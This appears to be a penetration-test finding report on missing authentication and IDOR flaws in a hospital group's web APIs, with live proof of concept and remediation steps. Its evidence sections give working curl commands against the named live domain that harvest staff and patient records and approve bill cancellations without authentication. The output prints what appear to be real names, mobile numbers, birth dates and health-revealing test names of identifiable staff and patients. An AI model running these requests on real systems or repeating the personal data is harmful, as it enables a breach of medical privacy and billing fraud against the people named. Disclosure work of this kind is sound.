# WEB-2026-002 — Unauthenticated Mass Employee PII, Biometric Photo, Patient PHI, Medical Lab Bills, & Unauthorized Bill Cancellation Approval via IDOR Chains (`/NnoteApi/` & `/NtraktApi/`)

| Field | Value |
|---|---|
| **Finding ID** | WEB-2026-002 |
| **Severity** | **Critical** |
| **CVSS v3.1 Score** | **9.8** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`) |
| **CWE** | CWE-306 (Missing Authentication for Critical Function), CWE-639 (Authorization Bypass Through User-Controlled Key / IDOR), CWE-359 (Exposure of Private Personal Information) |
| **OWASP Top 10 (2021)** | A01:2021 — Broken Access Control |
| **Affected Targets** | `https://narayanagroup.co.in/NtraktApi/api/User/Info/{empid}`, `https://narayanagroup.co.in/NnoteApi/api/Nnote/User/Info/{empid}`, `https://narayanagroup.co.in/NnoteApi/api/Investigation/Cancel/Approval/List`, `https://narayanagroup.co.in/NnoteApi/api/Patient/Info/{prno}`, `https://narayanagroup.co.in/NnoteApi/api/Investigation/Cancel/Bill/{prno}/{oldBillNo}/{billNo}`, `https://narayanagroup.co.in/NnoteApi/api/Investigation/Cancel/Approve` |
| **Status** | Confirmed (Live Target — Both Staff PII & Patient PHI Chains Verified) |

---

## 1. Summary

All backend REST API endpoints supporting `/Nnote/` and `/ncare/` under `/NtraktApi/api/` and `/NnoteApi/api/` operate **with zero authentication or object-level authorization**. Two complete, self-contained unauthenticated attack chains were verified live:

1. **Attack Chain A (Hospital Staff PII & Biometric Photo Dump):**
   - Calling `GET /NnoteApi/Api/Nnote/Assignee/{1..5}` leaks internal staff Employee IDs and full names.
   - Passing a leaked Employee ID (`3334024`) to `GET /NtraktApi/api/User/Info/3334024` (or `/NnoteApi/api/Nnote/User/Info/3334024`) returns full employee PII, mobile number, DOB, DOJ, department, designation, hospital branch, a high-resolution Base64 JPEG photograph (with Canon CanoScan LiDE 120 EXIF metadata), and account schema fields (`Password`, `OTP`, `OTPMessage`, `AbhaId`).
2. **Attack Chain B (Patient PHI, Medical Lab Test Bills, & Financial Bill Cancellation Approval):**
   - Calling `GET /NnoteApi/api/Investigation/Cancel/Approval/List` dumps a live list of Patient Registration Numbers (`Prno`) and Medical Bill Numbers (`BillNo`, `OldBillNo`).
   - Passing a leaked Patient Registration Number (`1005411787`) to `GET /NnoteApi/api/Patient/Info/1005411787` returns the patient's full name (`B.SUJATHAMMA`), age (`47 Y`), gender (`F`), mobile number (`9550007814`), and schema fields including `Aadhar`, `PIN`, `ConfirmPIN`, `PatPhoto`, `DoctorName`, and `WardName`.
   - Passing the bill identifiers to `GET /NnoteApi/api/Investigation/Cancel/Bill/1005411787/202310090822/202310160001` discloses the patient's clinical lab test (`NBBCRM01` — `CROSS MATCHING & BLOOD GROUPING`) and financial charges (`PaidCharge: 400`, `TotalCharges: 1400`).
   - Finally, `POST /NnoteApi/api/Investigation/Cancel/Approve` allows unauthenticated approval of hospital bill cancellations.

---

## 1A. Phase 2 Re-Verification & Extension (2026-10-12) — ✅ CONFIRMED INDEPENDENTLY

Chain B was re-tested from scratch during Phase 2 against **different patients**, and the chain reproduced completely. This is an independent confirmation, not a restatement.

### 1A.1 The chain, end to end, with a second and third patient

```
Step 1   GET /NnoteApi/api/Investigation/Cancel/Approval/List
         → 101 records (38 dated 2026, 34 distinct Prno)

Step 2   GET /NnoteApi/api/Patient/Info/20211103705
         → PRAS……  ·  Age 55  ·  M  ·  Mobile 9491……  ·  OrganisationCode ARM

Step 3   GET /NnoteApi/api/Investigation/Cancel/Bill/20211103705/202601100509/202601100002
         → the investigations that patient underwent, with charges
```

**Step 3 output (live, 3 records):**

| TestCode | TestDescription | Charge | Paid | CancelTest |
|---|---|---|---|---|
| `NT11211219` | **Ultra Sound Swelling ( Big )** | 400 | 400 | Y |
| `NRCDUL01` | **DOPPLER STUDY OF LOWER LIMBS (ONE) VENIOUS** | 750 | 750 | N |
| `NHMICVS` | **VIRAL SCREENING TEST** | 660 | 660 | N |

Plus `PatientId 1026401922`, `PayType CMP_CREDIT`, `Status E`, `TotalCharges 1810`, referring and treating doctor codes and names.

**A third patient** (`Prno 20251259069`, `PayType PAYING`, `TotalCharges 2500`):

| TestCode | TestDescription | Charge |
|---|---|---|
| `CT128SB` | **CT BRAIN PLAIN ( OPTIMA 660 128SLICE )** | 2500 |

### 1A.2 Why this matters more than the Phase 1 sample

The Phase 1 sample was a blood-grouping test. The Phase 2 sample includes a **viral screening test** and a **CT brain scan**. Those are investigations whose *names alone* disclose health information about the patient:

- **Viral screening** — occupies the same social and employment risk category as HIV and hepatitis testing
- **CT brain** — indicates neurological investigation, with all the implications for employment, insurance and driving that follow

Both resolve to a named individual with a mobile number in one further request.

### 1A.3 Parameter order corrected

The Phase 1 write-up used `{prno}/{billno}/{cbillno}`. Testing established the working order is:

```
/{regno}/{OldBillNo}/{BillNo}
```

The cancellation bill number goes last. Supplying them the other way round returns zero records — which is why several earlier probes came back empty.

### 1A.4 Scale

| Metric | Value |
|---|---|
| Records in `Cancel/Approval/List` | 101 |
| Records dated 2026 | 38 |
| **Distinct patients (Prno) in 2026 alone** | **34** |
| Date range covered | 30-SEP-2024 → 01-OCT-2026 |

This is the **cancellation queue only** — a subset of investigations. It is not the full investigation history.

### 1A.5 ✅ Clean negative — no credentials in the employee response

`api/User/Info/{id}` includes `Password`, `OTP` and `OTPMessage` in its response schema. These were checked across four employee records (`3334024`, `45605236`, `45604917`, `45604916`):

| Field | Result |
|---|---|
| `Password` | **EMPTY in 4/4 records** |
| `OTP` | **EMPTY in 4/4 records** |
| `OTPMessage` | **EMPTY in 4/4 records** |

**No credential material is exposed by this endpoint.** This is recorded as a verified negative and should be acknowledged as a positive finding about the implementation: the fields exist in the data model but were correctly excluded from serialisation.

The same check on the patient side found `AadharNo` empty in all laboratory records tested (see WEB-2026-015).

---

## 2. Technical Evidence & Live Proof of Concept

### 2.1 Attack Chain A — Unauthenticated Hospital Staff PII & Photo Dump

#### Step A1: Enumerate Staff IDs (`GET /NnoteApi/Api/Nnote/Assignee/1..5`)
```bash
curl -s "https://narayanagroup.co.in/NnoteApi/Api/Nnote/Assignee/1"
curl -s "https://narayanagroup.co.in/NnoteApi/Api/Nnote/Assignee/3"
curl -s "https://narayanagroup.co.in/NnoteApi/Api/Nnote/Assignee/5"
```
```json
Service 1: {"data":[{"AssigneeId":"3334024","AssigneeName":"Yepuri N V K Meerendra Balu"}]}
Service 3: {"data":[{"AssigneeId":"545600015","AssigneeName":"DHILLY SEKHAR"}]}
Service 5: {"data":[{"AssigneeId":"545600052","AssigneeName":"YARABOLU SURESH"}]}
```

#### Step A2: Retrieve Full Employee PII & Biometric Photo (`GET /NtraktApi/api/User/Info/3334024` & `/NnoteApi/api/Nnote/User/Info/3334024`)
```bash
curl -s "https://narayanagroup.co.in/NtraktApi/api/User/Info/3334024"
```
```json
{
  "data": [{
    "OperatorCode": null,
    "OperatorName": null,
    "Password": null,
    "Active": null,
    "LoginId": null,
    "MobApp": null,
    "UniqueId": null,
    "MobileNo": "9966362143",
    "EmpNo": "NES3334024",
    "BioEmpNo": "3334024",
    "EmpPhoto": "/9j/4AAQSkZJRgABAQEBLAEsAAD/4QKWRXhpZgAATU0AKgAAAAgABAEPAAIAAAAGAAABSgEQAAIAAAASAAABUIdpAAQ... [Full High-Resolution JPEG Photo with Canon CanoScan LiDE 120 EXIF] ...",
    "Doj": "01/MAY/2025",
    "Name": " Yepuri N V K Meerendra Balu",
    "Dob": "15/AUG/1991",
    "Gender": "M",
    "PhoneNo": "9966362143",
    "Department": "HARDWARE",
    "Designation": "INCHARGE",
    "OfficeType": "HOSPITAL",
    "Branch": "PRO-GHA-HL",
    "StatusType": "ACTIVE",
    "DepartmentSlno": 72,
    "DesignationSlno": 157,
    "OfficeTypeSlno": 10,
    "BranchSlno": 456,
    "OTP": null,
    "OTPMessage": null,
    "UserStatus": "",
    "UserHostAddress": null,
    "AbhaId": ""
  }]
}
```

---

### 2.2 Attack Chain B — Unauthenticated Patient PHI, Lab Investigation Records, & Bill Cancellation

#### Step B1: Dump Pending Patient Bill Cancellation Queue (`GET /NnoteApi/api/Investigation/Cancel/Approval/List`)
```bash
curl -s "https://narayanagroup.co.in/NnoteApi/api/Investigation/Cancel/Approval/List"
```
```json
{
  "data": [
    {"BillNo":"202310160001","BillDate":"10/16/2023 00:00:00","Prno":"1005411787","OldBillNo":"202310090822","Remarks":null},
    {"BillNo":"202311170001","BillDate":"11/17/2023 00:00:00","Prno":"20231132634","OldBillNo":"202311170155","Remarks":null},
    {"BillNo":"202311250002","BillDate":"11/25/2023 00:00:00","Prno":"1005416039","OldBillNo":"202311240112","Remarks":null},
    {"BillNo":"202311270003","BillDate":"11/27/2023 00:00:00","Prno":"1005416329","OldBillNo":"202311270351","Remarks":null},
    {"BillNo":"202311280003","BillDate":"11/28/2023 00:00:00","Prno":"20231123927","OldBillNo":"202311280305","Remarks":null}
  ]
}
```

#### Step B2: Retrieve Patient Demographics & PHI (`GET /NnoteApi/api/Patient/Info/1005411787`)
```bash
curl -s "https://narayanagroup.co.in/NnoteApi/api/Patient/Info/1005411787"
```
```json
{
  "data": [{
    "Regno": 1005411787,
    "PatientId": 0,
    "IPatientId": 0,
    "Name": "B.SUJATHAMMA",
    "DOB": null,
    "Age": 47,
    "AgeType": "Y",
    "Gender": "F",
    "MobileNo": "9550007814",
    "Aadhar": null,
    "AdmitDate": null,
    "DischargeDate": null,
    "Department": null,
    "DoctorName": null,
    "BedId": null,
    "WardName": null,
    "OrganisationCode": "LAB",
    "PIN": 0,
    "ConfirmPIN": 0,
    "PatPhoto": null
  }]
}
```

#### Step B3: Retrieve Patient Medical Lab Test & Billing Details (`GET /NnoteApi/api/Investigation/Cancel/Bill/1005411787/202310090822/202310160001`)
```bash
curl -s "https://narayanagroup.co.in/NnoteApi/api/Investigation/Cancel/Bill/1005411787/202310090822/202310160001"
```
```json
{
  "data": [{
    "BillNo": "202310090822",
    "BillDate": "10/9/2023 00:00:00",
    "CancelTest": "Y",
    "Charge": "400",
    "CreditCharge": "0",
    "DoctorCode": "",
    "DoctorName": "SELF",
    "DoctorFee": "",
    "OrganisationCode": "",
    "PaidCharge": "400",
    "PatientId": "",
    "PayType": "PAYING",
    "Prno": "1005411787",
    "Quantity": "1",
    "RefDoctorCode": "SELF",
    "Status": "E",
    "TestCode": "NBBCRM01",
    "TestDescription": "CROSS MATCHING & BLOOD GROUPING",
    "TotalCharges": "1400"
  }]
}
```

#### Step B4: Unauthenticated Financial Bill Cancellation Approval (`POST /NnoteApi/api/Investigation/Cancel/Approve`)
In `https://narayanagroup.co.in/Nnote/invcanapprove.html`, clicking Approve sends `POST /NnoteApi/api/Investigation/Cancel/Approve` with zero authentication headers or session validation.

---

## 3. Business, Clinical, Financial & Regulatory Impact

- **Large-Scale Healthcare PHI & Staff PII Breach (DPDP Act 2023):** Any anonymous internet user can harvest patient names, ages, genders, phone numbers, Aadhaar/PIN fields, diagnostic lab tests (`CROSS MATCHING & BLOOD GROUPING`), and full staff biometric records.
- **Unauthorized Financial Bill Cancellation:** Unauthenticated access to `/NnoteApi/api/Investigation/Cancel/Approve` allows attackers to approve medical bill cancellations without authorization.

---

## 4. Remediation

1. **Enforce Mandatory Authentication Across All `/NtraktApi/` and `/NnoteApi/` Controllers:** Apply `[Authorize]` globally and reject all unauthenticated requests with `401 Unauthorized`.
2. **Enforce Role-Based & Object-Level Authorization (RBAC / IDOR Prevention):**
   - Restrict `/Investigation/Cancel/*` strictly to authenticated, authorized billing supervisors.
   - Restrict `/Patient/Info/{prno}` and `/User/Info/{empid}` to the authenticated record owner or authorized clinical staff.
3. **Use Minimal DTOs:** Never return raw database entities containing `Password`, `PIN`, `ConfirmPIN`, `OTP`, `Aadhar`, or `AbhaId` fields.
